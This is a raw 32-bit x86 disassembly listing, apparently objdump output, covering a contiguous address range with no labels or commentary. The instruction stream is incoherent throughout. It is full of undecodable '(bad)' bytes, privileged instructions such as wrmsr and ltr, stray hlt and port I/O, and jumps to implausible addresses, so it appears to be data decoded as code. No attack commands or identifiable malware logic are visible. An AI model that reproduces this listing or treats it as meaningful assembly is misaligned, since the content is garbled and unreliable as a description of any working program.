  418f6a:	mov    edi,DWORD PTR [ecx-0x78]
  418f6d:	ltr    WORD PTR [ecx-0x7b]
  418f71:	dec    DWORD PTR [edi]
  418f73:	clc    
  418f74:	out    0x45,eax
  418f76:	add    BYTE PTR [eax],cl
  418f78:	cmp    ebx,0xffffff8c
  418f7b:	jge    0x418f7d
  418f7d:	jb     0x418f8f
  418f7f:	je     0x508fff
  418f85:	pop    edx
  418f86:	push   esi
  418f87:	mov    ecx,DWORD PTR [edi]
  418f89:	in     al,dx
  418f8a:	rol    DWORD PTR [ebp+0x0],1
  418f8d:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  418f94:	cmp    DWORD PTR [ecx],0xfffffff0
  418f97:	hlt    
  418f98:	mov    esp,DWORD PTR [eax+0xf034d2b]
  418f9e:	(bad)  
  418fa0:	push   eax
  418fa1:	jns    0xb841741f
  418fa7:	lock push cs
  418fa9:	ror    edx,0x3
  418fac:	test   BYTE PTR [ecx+0x5500e800],cl
  418fb2:	dec    eax
  418fb3:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  418fb7:	(bad)  
  418fb8:	mov    esi,0x7f33ff5f
  418fbd:	inc    eax
  418fbe:	test   DWORD PTR [edx],eax
  418fc0:	je     0x418f82
  418fc2:	mov    ecx,ecx
  418fc4:	adc    DWORD PTR [ebp-0xc],0xffffffec
  418fc8:	and    eax,DWORD PTR [eax+0xf0103]
  418fce:	jp     0x418fbc
  418fd0:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  418fd4:	add    edx,DWORD PTR [edi+0x74]
  418fd7:	sbb    BYTE PTR [ebp+0x4d001484],cl
  418fdd:	add    BYTE PTR [ebp-0x74c48bbb],al
  418fe3:	je     0x418f68
  418fe5:	cmp    eax,edi
  418fe7:	js     0x41900c
  418fe9:	add    eax,0xeb0fc003
  418fee:	jns    0x418f7b
  418ff0:	vmread DWORD PTR [ecx+0x45],ebx
  418ff4:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  418ffa:	adc    al,0x8b
  418ffc:	jge    0x419012
  418ffe:	mov    edi,DWORD PTR [eax-0x4]
  419001:	add    edi,DWORD PTR [edi]
  419003:	or     bh,bh
  419005:	push   ebp
  419006:	push   es
  419007:	mov    DWORD PTR [ebp-0x4],ebx
  41900a:	add    edi,esi
  41900c:	pop    es
  41900d:	add    esi,DWORD PTR [edi-0x48ccf183]
  419013:	mov    DWORD PTR [esp+esi*8],ecx
  419016:	inc    ebp
  419017:	pop    ebp
  419018:	xor    DWORD PTR [esi-0x4],0x3b
  41901c:	add    edx,DWORD PTR [ecx+edi*1]
  41901f:	push   es
  419020:	clc    
  419021:	mov    bh,0xdb
  419023:	jp     0x418fdc
  419025:	add    cl,BYTE PTR [esi]
  419027:	div    DWORD PTR [edi+0x4d8b0c1c]
  41902d:	test   edi,edi
  41902f:	je     0x419025
  419031:	mov    eax,ecx
  419033:	or     BYTE PTR [ebx],al
  419035:	dec    BYTE PTR [ecx+0x7d3bec7d]
  41903b:	jbe    0x4190af
  41903d:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  419043:	add    ecx,DWORD PTR [esi]
  419045:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  41904b:	add    eax,DWORD PTR [ebx-0x287af783]
  419051:	je     0x4190a0
  419053:	mov    DWORD PTR [ecx],edi
  419055:	mov    esi,eax
  419057:	hlt    
  419058:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  41905f:	jb     0x419021
  419061:	jmp    0x41904e
  419063:	xor    esi,DWORD PTR [ebx]
  419065:	pop    edi
  419066:	pop    esi
  419067:	pop    ebx
  419068:	ret    
  419069:	ret    0x8b
  41906c:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  419072:	xor    DWORD PTR [ecx],0xc
  419075:	pushf  
  419076:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  41907c:	wrmsr  
  41907e:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  419085:	dec    ebp
  419086:	ret    
  419087:	mov    edi,DWORD PTR [esi-0x4]
  41908a:	pop    eax
  41908b:	dec    ebp
  41908c:	jne    0x419019
  41908e:	xor    edi,esp
  419090:	inc    eax
  419091:	dec    ebp
  419092:	jbe    0x4190e7
  419094:	inc    eax
  419095:	pop    ebp
  419096:	add    edx,DWORD PTR [esi+0x8]
  419099:	push   ebp
  41909a:	dec    eax
  41909b:	push   ecx
  41909c:	mov    eax,edi
  41909e:	and    al,0xf0
  4190a0:	jo     0x41908d
  4190a2:	mov    eax,DWORD PTR [ebx]
  4190a4:	sbb    BYTE PTR [ebp+0x4d],cl
  4190a7:	mov    eax,DWORD PTR [ebx]
  4190a9:	nop
  4190aa:	or     BYTE PTR [eax],al
  4190ac:	jne    0x419105
  4190ae:	cmp    ebx,DWORD PTR [edi+esi*2-0x3cc76ce]
  4190b5:	xor    edi,edi
  4190b7:	add    edi,DWORD PTR [ebp+0x3]
  4190ba:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  4190c0:	js     0x419046
  4190c2:	jae    0x4190c6
  4190c4:	(bad)  
  4190c6:	xor    al,0x5d
  4190c8:	jmp    0x419055
  4190ca:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  4190d1:	fdecstp 
  4190d3:	test   BYTE PTR [edi],ah
  4190d5:	add    bh,BYTE PTR [ebp+0x0]
  4190d8:	add    ebx,DWORD PTR [ebp-0x77]
  4190db:	mov    edi,eax
  4190dd:	cmp    al,0x0
  4190e0:	adc    dh,BYTE PTR [ebx]
  4190e2:	jge    0x4190e7
  4190e4:	mov    edi,DWORD PTR [ebx]
  4190e6:	jl     0x4190f7
  4190e8:	clc    
  4190e9:	dec    edi
  4190ea:	jge    0x4190ec
  4190ec:	mov    eax,DWORD PTR [ebx]
  4190ee:	jb     0x4190f8
  4190f0:	mov    ecx,DWORD PTR [ebp-0x8]
  4190f3:	mov    edi,edi
  4190f5:	xor    edx,DWORD PTR [eax]
  4190f7:	add    edi,DWORD PTR [ebx]
  4190f9:	mov    DWORD PTR [ebp-0x10],edi
  4190fc:	inc    edi
  4190fd:	pop    ebp
  4190fe:	jge    0x41913b
  419100:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  419104:	mov    edx,0xc05d87f0
  419109:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  41910d:	fimul  WORD PTR [eax]
  41910f:	fist   WORD PTR [ebp+0x1c]
  419112:	in     al,dx
  419113:	jne    0x419101
  419115:	mov    edi,DWORD PTR [edx-0x7a27a10]
  41911b:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  41911f:	fdivp  st(0),st
  419121:	fild   WORD PTR [ebp+0x4510f85c]
  419127:	test   BYTE PTR [ebx+0x4d00fc02],cl
  41912d:	inc    ebp
  41912e:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  419134:	mov    ebp,DWORD PTR [ebx-0x4]
  419137:	adc    al,0x8b
  419139:	rcl    DWORD PTR [eax],0x48
  41913c:	mov    esi,0x7080803
  419141:	fiadd  WORD PTR [ebp+0x4d]
  419144:	(bad)  
  419145:	mov    edx,DWORD PTR [edx-0x4]
  419148:	mov    edx,DWORD PTR [ebp-0x4]
  41914b:	xor    ebx,DWORD PTR [ebx+0x330103]
  419151:	mov    DWORD PTR [edi+0x872dc],edi
  419157:	xlat   BYTE PTR ds:[ebx]
  419158:	into   
  419159:	ffreep st(6)
  41915b:	retf   0x6c7
  41915e:	iret   
  41915f:	dec    ebp
  419160:	inc    ebp
  419161:	mov    DWORD PTR [ebx],edi
  419163:	fmul   QWORD PTR [edi]
  419165:	dec    ebp
  419166:	jnp    0x41919b
  419168:	add    BYTE PTR [ebx],al
  41916a:	mov    ecx,DWORD PTR [esp+edi*8]
  41916d:	inc    ebp
  41916e:	dec    ebp
  41916f:	lea    esi,[ebx]
  419171:	add    DWORD PTR [ebx],eax
  419173:	jb     0x4191b0
  419175:	add    BYTE PTR [edi],cl
  419177:	inc    ebp
  419178:	imul   eax,edi,0x858bd800
  41917e:	cld    
  41917f:	clc    
  419180:	mov    DWORD PTR [ebp+0x0],eax
  419183:	inc    DWORD PTR [eax]
  419185:	or     al,0xde
  419187:	sbb    bh,0x1
  41918a:	retf   
  41918b:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  419192:	dec    ebp
  419193:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  419199:	enter  0x12de,0xdf
  41919d:	inc    ebp
  41919e:	pop    ebp
  41919f:	dec    DWORD PTR [ebx-0x257f0ff4]
  4191a5:	add    DWORD PTR [edx],edx
  4191a7:	add    BYTE PTR [ebp+0x50],dl
  4191aa:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  4191b0:	xor    ecx,DWORD PTR [eax-0x38c699fd]
  4191b6:	or     ah,al
  4191b8:	pop    ss
  4191b9:	cdq    
  4191ba:	push   ebp
  4191bb:	clc    
  4191bc:	mov    eax,DWORD PTR [ebp-0x4]
  4191bf:	xor    edx,edx
  4191c1:	add    esi,DWORD PTR [ebx]
  4191c3:	cmp    eax,DWORD PTR [ebx]
  4191c5:	hlt    
  4191c6:	cmp    DWORD PTR [ebx],esp
  4191c8:	or     al,BYTE PTR [ebp+0xf]
  4191cb:	mov    eax,DWORD PTR [edx]
  4191cd:	loopne 0x4191cf
  4191cf:	(bad)  
  4191d0:	mov    ecx,esi
  4191d2:	cld    
  4191d3:	pushf  
  4191d4:	pop    ebp
  4191d5:	pushf  
  4191d6:	mov    esi,DWORD PTR [edx]
  4191d8:	lock mov eax,eax
  4191db:	adc    BYTE PTR [ebx],al
  4191dd:	or     BYTE PTR [ebx+0x4d001001],0xcf
  4191e4:	xor    ebp,DWORD PTR [edi+0x50e45189]
  4191ea:	dec    ebp
  4191eb:	mov    ecx,DWORD PTR [ebx-0x31390304]
  4191f1:	(bad)  
  4191f2:	iret   
  4191f3:	inc    ebp
  4191f4:	(bad)  
  4191f5:	jne    0x419244
  4191f7:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  4191fd:	(bad)  
  4191fe:	cmp    ebx,eax
  419200:	je     0x419188
  419202:	add    edi,edi
  419204:	or     bh,bh
  419206:	dec    ebp
  419207:	inc    ebp
  419208:	mov    esi,DWORD PTR [ebx]
  41920a:	cld    
  41920b:	add    ecx,esi
  41920d:	cmp    ecx,DWORD PTR [eax-0xc]
  419210:	mov    edx,DWORD PTR [edi]
  419212:	or     BYTE PTR [ebp-0x7c],al
  419215:	mov    ebx,DWORD PTR [eax+ebp*8-0x7b7639ce]
  41921c:	or     al,0x9c
  41921e:	inc    ebp
  41921f:	xor    bh,BYTE PTR [ecx+ecx*4]
  419222:	pushf  
  419223:	call   0x5281b3
  419228:	jne    0x4191f1
  41922a:	mov    ebp,esp
  41922c:	fcomp  DWORD PTR [ebx]
  41922e:	add    BYTE PTR [ecx],al
  419230:	inc    DWORD PTR [ebp-0x75]
  419233:	(bad)  
  419234:	cld    
  419235:	add    al,0xce
  419237:	mov    ecx,edi
  419239:	cld    
  41923a:	inc    ebp
  41923b:	fidivr WORD PTR [ebx]
  41923d:	fbstp  TBYTE PTR [ebp-0x3e]
  419240:	mov    eax,DWORD PTR [eax]
  419242:	adc    BYTE PTR [ebx-0x3974038b],cl
  419248:	fadd   st,st(7)
  41924a:	add    BYTE PTR [ebp-0x1],al
  41924d:	mov    ecx,DWORD PTR [esp+edi*8]
  419250:	inc    ebp
  419251:	mov    bh,0xc7
  419254:	loopne 0x41929b
  419256:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  41925c:	sbb    BYTE PTR [ebx],dh
  41925e:	pushf  
  41925f:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  419265:	mov    eax,edi
  419267:	cwde   
  419268:	inc    ebp
  419269:	inc    ebp
  41926a:	jne    0x4191f7
  41926c:	mov    esp,esp
  41926e:	clc    
  41926f:	add    al,0x4d
  419271:	mov    DWORD PTR [ebx],esi
  419273:	or     al,0x33
  419275:	inc    ebp
  419276:	lea    ecx,[ebx-0x398d13fd]
  41927c:	add    bh,al
  41927e:	inc    ebp
  41927f:	ror    DWORD PTR [ebx+0x45d829],0x8b
  419286:	add    ebp,esp
  419288:	shufps xmm1,xmm3,0xc7
  41928c:	(bad)  
  41928d:	jmp    0x7486cdb6
  419292:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  419298:	hlt    
  419299:	mov    ecx,DWORD PTR [edi]
  41929b:	fadd   DWORD PTR [ebp+0x0]
  41929e:	xor    ecx,DWORD PTR [edi]
  4192a0:	add    ecx,ecx
  4192a2:	cmp    edi,edi
  4192a4:	pmuludq mm7,QWORD PTR [edx+0x50]
  4192a8:	(bad)  
  4192a9:	jmp    0x419236
  4192ab:	mov    edi,esp
  4192ad:	or     al,0xc6
  4192af:	inc    ebp
  4192b0:	(bad)  
  4192b1:	mov    eax,DWORD PTR [ebp+0x10]
  4192b4:	jne    0x41923f
  4192b6:	mov    eax,DWORD PTR [ecx]
  4192b8:	clc    
  4192b9:	add    BYTE PTR [ebp-0x40],cl
  4192bc:	xor    edx,DWORD PTR [eax-0x73]
  4192bf:	jne    0x4192c2
  4192c1:	push   DWORD PTR [edx+0x8]
  4192c4:	add    BYTE PTR [ebp+0x45],al
  4192c7:	mov    ebp,ecx
  4192c9:	cld    
  4192ca:	add    BYTE PTR [ebp+0x0],cl
  4192cd:	xor    eax,DWORD PTR [ebp+0x3]
  4192d0:	mov    DWORD PTR [ebx],edi
  4192d2:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  4192d8:	sub    eax,0x5d330e4d
  4192dd:	lea    esi,[ebx]
  4192df:	add    DWORD PTR [ebx],eax
  4192e1:	jb     0x4192cc
  4192e3:	add    BYTE PTR [eax],al
  4192e5:	inc    ebp
  4192e6:	add    bl,ch
  4192e8:	inc    ebp
  4192e9:	mov    esi,DWORD PTR [ebx]
  4192eb:	or     al,0x3
  4192ed:	(bad)  
  4192ee:	mov    edi,eax
  4192f0:	in     al,dx
  4192f1:	scas   eax,DWORD PTR es:[edi]
  4192f2:	inc    ebp
  4192f3:	mov    esi,DWORD PTR [ebx]
  4192f5:	in     al,0x3
  4192f7:	add    al,0x89
  4192f9:	mov    ecx,DWORD PTR [eax+edi*8]
  4192fc:	dec    ebp
  4192fd:	(bad)  
  4192fe:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3164]
  419305:	mov    ecx,eax
  419307:	cld    
  419308:	push   es
  419309:	dec    ebp
  41930a:	add    al,0x33
  41930c:	mov    DWORD PTR [ebx],eax
  41930e:	in     al,dx
  41930f:	cmp    DWORD PTR [ebp-0x67],eax
  419312:	mov    eax,DWORD PTR [ebp-0xba0068]
  419318:	mov    edx,DWORD PTR [ebp-0x4]
  41931b:	mov    ecx,DWORD PTR [ebp-0x18]
  41931e:	xor    ecx,DWORD PTR [ebp+0x3]
  419321:	cmp    DWORD PTR [ebx],0x8b32749b
  419327:	xor    edi,esp
  419329:	jmp    0xff75907b
  41932e:	add    ecx,DWORD PTR [ebp-0x3f]
  419331:	xor    ebx,DWORD PTR [edi]
  419333:	add    eax,ecx
  419335:	cmp    ebx,DWORD PTR [eax]
  419337:	mov    ecx,DWORD PTR [ebp-0x4]
  41933a:	mov    ecx,DWORD PTR [eax]
  41933c:	adc    BYTE PTR [ebp-0x80],al
  41933f:	jmp    0x419342
  419341:	mov    eax,DWORD PTR [eax]
  419343:	cld    
  419344:	mov    bh,0xc6
  419346:	push   ecx
  419347:	(bad)  
  419348:	jne    0x4193a8
  41934a:	dec    ecx
  41934c:	or     BYTE PTR [ecx+ebx*1],cl
  41934f:	push   ebp
  419350:	inc    ebp
  419351:	in     al,dx
  419352:	add    ebp,esp
  419354:	or     bh,al
  419356:	dec    ebp
  419357:	cld    
  419358:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  41935e:	xor    DWORD PTR [eax],0x2
  419361:	pushf  
  419362:	dec    DWORD PTR [ebx+0x45510cf4]
  419368:	mov    DWORD PTR [ebx+0x5545fc0c],ecx
  41936e:	mov    edx,DWORD PTR [ecx+0xc]
  419371:	xor    eax,esi
  419373:	mov    edx,0xc172c7
  419378:	inc    ebp
  419379:	mov    esi,DWORD PTR [ebp+0x8]
  41937c:	mov    eax,edx
  41937e:	call   0x84c65a73
  419383:	add    DWORD PTR [eax+eax*1-0x7476bace],ebx
  41938a:	call   0x4db1a397
  41938f:	push   edi
  419390:	xor    esi,DWORD PTR [ebp+0x3]
  419393:	(bad)  
  419394:	pmulhuw mm0,mm1
  419397:	test   DWORD PTR [ebp-0x8],ecx
  41939a:	mov    DWORD PTR [ebp-0x67],eax
  41939d:	mov    eax,DWORD PTR [ebp-0x4]
  4193a0:	xor    edi,DWORD PTR [ebp-0x73]
  4193a3:	xor    eax,DWORD PTR [ebx]
  4193a5:	xor    esi,DWORD PTR [edx+0x3]
  4193a8:	add    BYTE PTR [ecx],bh
  4193aa:	inc    ebp
  4193ab:	(bad)  
  4193ac:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  4193b2:	mov    DWORD PTR [eax],0x750f0004
  4193b8:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  4193be:	lock add BYTE PTR [ebp+0x0],al
  4193c2:	mov    esi,DWORD PTR [ebp-0x2c]
  4193c5:	mov    ebp,edx
  4193c7:	or     al,0x72
  4193c9:	ja     0x4193cb
  4193cb:	mov    edx,esi
  4193cd:	cld    
  4193ce:	(bad)  
  4193d1:	cli    
  4193d2:	mov    esi,DWORD PTR [ebp-0x4]
  4193d5:	cmp    ecx,esi
  4193d7:	bswap  edi
  4193d9:	(bad)
  4193dd:	mov    esi,DWORD PTR [ebp-0x4]
  4193e0:	mov    esi,ecx
  4193e2:	clc    
  4193e3:	repnz add esi,DWORD PTR [ebp+0x45]
  4193e7:	push   ebx
  4193e8:	xor    eax,DWORD PTR [ebp+0x3]
  4193eb:	xor    bl,BYTE PTR [edi-0x64]
  4193ee:	pop    ebx
  4193ef:	jmp    0x4194b6
  4193f4:	mov    esi,DWORD PTR [ebp-0x7d]
  4193f7:	xor    ebp,DWORD PTR [eax]
  4193f9:	lea    eax,[ebp-0x8]
  4193fc:	xor    edx,esi
  4193fe:	pushf  
  4193ff:	out    dx,eax
  419400:	(bad)  
  419401:	neg    eax
  419403:	ins    DWORD PTR es:[edi],dx
  419404:	test   esi,edi
  419406:	clc    
  419407:	pop    esp
  419408:	inc    ebp
  419409:	or     BYTE PTR [ecx+0x450f0c7d],cl
  41940f:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  419415:	add    cl,al
  419417:	jne    0x4193b5
  419419:	mov    esi,DWORD PTR [edx]
  41941b:	in     al,dx
  41941c:	push   esi
  41941d:	xor    BYTE PTR [ebp-0xe],dh
  419420:	add    edi,esi
  419422:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  419428:	add    cl,bh
  41942a:	mov    edi,DWORD PTR [ebp+0x8]
  41942d:	mov    DWORD PTR [ebp-0x14],esi
  419430:	add    esi,DWORD PTR [ebp+0x3c]
  419433:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  419439:	mov    ah,0x3c
  41943b:	pushf  
  41943c:	pushf  
  41943d:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  419443:	jne    0x4193d0
  419445:	mov    ecx,DWORD PTR [esp+ebp*8]
  419448:	icebp  
  419449:	icebp  
  41944a:	shl    edx,0xf2
  41944d:	(bad)  
  41944e:	mov    ah,0x16
  419450:	pop    eax
  419451:	jne    0x4193e6
  419453:	mov    ecx,DWORD PTR [edi]
  419455:	in     al,dx
  419456:	jmp    0x419449
  419458:	add    dl,dh
  41945a:	mov    edi,esi
  41945c:	or     al,0x8
  41945e:	inc    ebp
  41945f:	jne    0x419464
  419461:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  419467:	ret    
  419468:	or     bh,bh
  41946a:	jge    0x419454
  41946c:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  419472:	xor    edi,eax
  419474:	add    esi,DWORD PTR [ebp-0x77]
  419477:	mov    ebx,esp
  419479:	clc    
  41947a:	neg    DWORD PTR [ebp-0x7c]
  41947d:	xor    eax,DWORD PTR [eax]
  41947f:	cmp    eax,DWORD PTR [eax]
  419481:	repz jne 0x419419
  419484:	xor    eax,DWORD PTR [ecx]
  419486:	add    ebx,DWORD PTR [eax]
  419488:	mov    DWORD PTR [ebp-0x8],eax
  41948b:	mov    eax,edi
  41948d:	cld    
  41948e:	lock pop eax
  419490:	test   DWORD PTR [ebx],esi
  419492:	clc    
  419493:	add    edx,DWORD PTR [edi-0x740bff77]
  419499:	fdivp  st(4),st
  41949b:	test   ecx,esi
  41949d:	(bad)  
  41949e:	jnp    0x41949f
  4194a0:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  4194a6:	jae    0x419433
  4194a8:	sub    edi,esp
  4194aa:	(bad)  
  4194ab:	shl    DWORD PTR [eax-0x3e],0x89
  4194af:	leave  
  4194b0:	call   0x81974bbd
  4194b5:	in     al,dx
  4194b6:	(bad)  
  4194b7:	in     al,dx
  4194b8:	add    bh,al
  4194ba:	mov    esp,edi
  4194bc:	in     al,dx
  4194bd:	test   DWORD PTR [ebp-0x8],edi
  4194c0:	mov    eax,DWORD PTR [ebp+0x2b]
  4194c3:	xor    BYTE PTR [ebx],al
  4194c5:	pushf  
  4194c6:	jnp    0x573090ff
  4194cc:	xor    edx,DWORD PTR [ebp-0x77]
  4194cf:	push   ecx
  4194d0:	loopne 0x419505
  4194d2:	jne    0x41948f
  4194d4:	mov    esi,DWORD PTR [edx-0x20]
  4194d7:	add    BYTE PTR [ebp-0x3d],bh
  4194da:	xor    eax,DWORD PTR [ebp-0x73]
  4194dd:	mov    edi,DWORD PTR [esi]
  4194df:	cld    
  4194e0:	jb     0x4194a8
  4194e2:	add    bl,al
  4194e4:	jne    0x41952b
  4194e6:	mov    edx,DWORD PTR [edi-0x10]
  4194e9:	jge    0x419568
  4194eb:	mov    esi,DWORD PTR [ebx]
  4194ed:	lock add ecx,DWORD PTR [ebp+0x3b]
  4194f1:	xor    esi,DWORD PTR [ebp-0x77]
  4194f4:	mov    esi,eax
  4194f6:	lock inc ebp
  4194f8:	jge    0x41952b
  4194fa:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  419501:	dec    ebp
  419502:	mov    esi,DWORD PTR [ebx]
  419504:	loopne 0x41948f
  419506:	jge    0x419500
  419508:	add    DWORD PTR [ebp-0x7d],eax
  41950b:	icebp  
  41950c:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  419513:	dec    ebp
  419514:	hlt    
  419515:	xor    ebx,DWORD PTR [ebp-0x77]
  419518:	mov    esi,esp
  41951a:	in     al,0x45
  41951c:	jge    0x41955b
  41951e:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  419525:	dec    ebp
  419526:	pop    esp
  419527:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  41952d:	inc    ebp
  41952e:	hlt    
  41952f:	xor    DWORD PTR [ebp-0x61],esi
  419532:	mov    edi,DWORD PTR [eax+0xf19504]
  419538:	repnz mov DWORD PTR [ebp+0x20],ebx
  41953c:	cmp    eax,DWORD PTR [ebp+0xf]
  41953f:	test   DWORD PTR [edi+ecx*1-0x1],edx
  419543:	fistp  WORD PTR [ebx+0x0]
  419546:	inc    ebp
  419547:	mov    ebx,DWORD PTR [edi+0xc]
  41954a:	add    eax,eax
  41954c:	inc    ebp
  41954d:	test   BYTE PTR [ebx],dh
  41954f:	add    eax,DWORD PTR [ebx]
  419551:	add    BYTE PTR [esi+0x45],bl
  419554:	ret    0x85
  419557:	jnp    0x54421926
  41955d:	inc    bp
  41955f:	inc    ebp
  419560:	xor    DWORD PTR [ecx+0xc78a9c],edi
  419566:	fdiv   QWORD PTR [ebx]
  419568:	test   DWORD PTR [ecx+0x453bf8],edi
  41956e:	push   ebx
  41956f:	add    edi,DWORD PTR [esi+0x708088b]
  419575:	cmp    esi,eax
  419577:	setl   BYTE PTR [ecx-0x74fcffce]
  41957e:	mov    esp,edi
  419580:	call   0x33ccdad2
  419585:	or     BYTE PTR [ebx],al
  419587:	inc    ecx
  419588:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  41958e:	and    BYTE PTR [ebp-0x7074f0bb],al
  419594:	lock add cl,al
  419597:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  41959e:	mov    ch,0x45
  4195a0:	clc    
  4195a1:	xor    eax,DWORD PTR [ebp+0x3]
  4195a4:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4195aa:	inc    ebp
  4195ab:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4195b1:	mov    edi,eax
  4195b3:	mov    eax,DWORD PTR [ebp+0x3c]
  4195b6:	mov    ecx,DWORD PTR [eax]
  4195b8:	hlt    
  4195b9:	inc    ebp
  4195ba:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4195c1:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4195c7:	push   ebp
  4195c8:	mov    edi,DWORD PTR [ebx]
  4195ca:	in     al,dx
  4195cb:	jne    0x41958e
  4195cd:	mov    eax,DWORD PTR [ebp-0x28]
  4195d0:	add    DWORD PTR [eax],0xe8058dec
  4195d6:	clc    
  4195d7:	mov    esi,DWORD PTR [edi-0x8]
  4195da:	add    dh,dl
  4195dc:	rol    WORD PTR [ebp-0x1],cl
  4195e0:	mov    edx,DWORD PTR [eax+0x8]
  4195e3:	jne    0x4195a5
  4195e5:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  4195ec:	inc    ebp
  4195ed:	push   esp
  4195ee:	test   DWORD PTR [ecx+0xf],ecx
  4195f1:	sub    edx,esp
  4195f3:	add    eax,DWORD PTR [eax]
  4195f5:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  4195fb:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  419602:	mov    eax,DWORD PTR [ecx]
  419604:	and    BYTE PTR [eax],al
  419606:	adc    BYTE PTR ds:[eax],al
  419609:	inc    ebp
  41960a:	inc    cx
  41960d:	push   esp
  41960e:	add    al,0x75
  419610:	add    BYTE PTR [edx+0x66],dl
  419613:	enter  0xc1,0x4d
  419617:	mov    esp,DWORD PTR [esi+0x20]
  41961a:	add    DWORD PTR [ecx-0x7b],eax
  41961d:	add    eax,DWORD PTR [ebx]
  41961f:	str    WORD PTR [eax+0x45]
  419623:	lea    ecx,[ebx+0x45890801]
  419629:	sbb    BYTE PTR [ebx],al
  41962b:	dec    ebp
  41962c:	cmp    al,0xf
  41962e:	inc    ebp
  41962f:	push   eax
  419630:	mov    esi,DWORD PTR [ebx]
  419632:	push   eax
  419633:	add    eax,eax
  419635:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  41963c:	inc    ebp
  41963d:	add    BYTE PTR [ecx],dh
  41963f:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  419646:	(bad)  
  419647:	mov    ebx,eax
  419649:	loopne 0x419690
  41964b:	dec    ebp
  41964c:	mov    ecx,DWORD PTR [edi]
  41964e:	cld    
  41964f:	push   eax
  419650:	xchg   DWORD PTR [ebx],esi
  419652:	add    DWORD PTR [ebx],ebp
  419654:	add    BYTE PTR [ebx],ch
  419656:	or     BYTE PTR [ecx],bh
  419658:	dec    ecx
  419659:	loopne 0x41965e
  41965b:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  419661:	push   ebp
  419662:	add    DWORD PTR [ebx+0x55100800],eax
  419668:	dec    ebp
  419669:	jmp    0x4195f4
  41966b:	mov    esp,DWORD PTR [eax]
  41966d:	sbb    dl,dl
  41966f:	inc    eax
  419670:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  419676:	add    BYTE PTR [ebx+0x74528555],cl
  41967c:	push   ebp
  41967d:	div    DWORD PTR [ebx]
  41967f:	and    eax,DWORD PTR [ebx]
  419681:	add    edx,DWORD PTR [edx-0x30]
  419684:	jno    0x419611
  419686:	inc    DWORD PTR [eax+eiz*1]
  419689:	inc    ebp
  41968a:	push   eax
  41968b:	push   eax
  41968c:	mov    esp,DWORD PTR [edi-0x74beff1c]
  419692:	mov    edi,esp
  419694:	push   eax
  419695:	inc    ebp
  419696:	enter  0x458b,0x8
  41969a:	push   ecx
  41969b:	(bad)  
  41969c:	call   0x10ba074
  4196a1:	pop    ss
  4196a2:	push   ebp
  4196a3:	mov    ecx,DWORD PTR [ebx+0x489408]
  4196a9:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4196af:	push   ecx
  4196b0:	jo     0x41969a
  4196b2:	inc    DWORD PTR [edi]
  4196b4:	or     BYTE PTR [eax],al
  4196b6:	call   0xcc9e00
  4196bb:	fmul   QWORD PTR [ebp+0x55]
  4196be:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4196c4:	mov    bh,0x8c
  4196c6:	adc    al,0x9c
  4196c8:	dec    esp
  4196c9:	xor    bl,BYTE PTR [eax]
  4196cb:	mov    ecx,DWORD PTR [ebp+0xc]
  4196ce:	mov    eax,DWORD PTR [ebp-0x4]
  4196d1:	mov    esi,DWORD PTR [edi-0x3148f924]
  4196d7:	push   es
  4196d8:	retf   
  4196d9:	mov    BYTE PTR [ebp-0x30],0x3b
  4196dd:	inc    ebp
  4196de:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4196e5:	retf   0x83fc
  4196e8:	into   
  4196e9:	dec    ebp
  4196ea:	retf   
  4196eb:	mov    ecx,DWORD PTR [ebp-0x74]
  4196ee:	mov    eax,DWORD PTR [eax]
  4196f0:	fdiv   QWORD PTR [ebx]
  4196f2:	mov    bh,0x3
  4196f4:	push   es
  4196f5:	mov    esi,ecx
